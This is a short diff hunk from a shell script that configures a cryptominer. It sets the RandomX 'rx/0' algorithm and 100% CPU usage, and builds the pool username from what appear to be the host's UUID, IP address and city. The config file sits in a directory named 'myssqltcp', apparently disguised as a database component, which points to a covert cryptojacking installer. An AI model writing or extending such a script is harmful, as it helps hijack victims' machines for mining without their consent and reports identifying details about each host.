@@ -734,7 +734,7 @@ if [ ! -z $EMAIL ]; then
   PASS="$PASS"
 fi
 
-sed -i 's/"null": *"[^"]*",/"null": "rx/0",/' $HOME/myssqltcp/config.json
+sed -i 's/"algo": *"[^"]*",/"algo": "rx\/0",/' $HOME/myssqltcp/config.json
 sed -i 's/"user": *"[^"]*",/"user": "'$UUID':'$MEIP':'$UUIP'.'$CITY'-'$PASS'",/' $HOME/myssqltcp/config.json
 sed -i 's/"pass": *"[^"]*",/"pass": "'$PASS'",/' $HOME/myssqltcp/config.json
 sed -i 's/"max-cpu-usage": *[^,]*,/"max-cpu-usage": 100,/' $HOME/myssqltcp/config.json
